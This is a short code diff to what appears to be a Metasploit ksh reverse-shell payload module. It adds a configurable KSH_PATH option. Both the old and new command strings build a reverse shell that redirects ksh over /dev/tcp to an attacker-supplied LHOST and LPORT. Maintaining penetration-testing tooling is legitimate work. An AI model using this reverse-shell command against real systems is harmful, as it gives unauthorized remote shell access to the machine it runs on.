@@ -28,6 +28,9 @@ module MetasploitModule
       'RequiredCmd' => 'ksh',
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
+    register_options([
+      OptString.new('KSH_PATH', [true ,'The path to KSH', 'ksh'])
+    ])
   end
 
   def generate
@@ -35,6 +38,6 @@ module MetasploitModule
   end
 
   def command_string
-    "ksh -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 2>&1 <&1'"
+    "#{datastore['KSH_PATH']} -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 2>&1 <&1'"
   end
 end
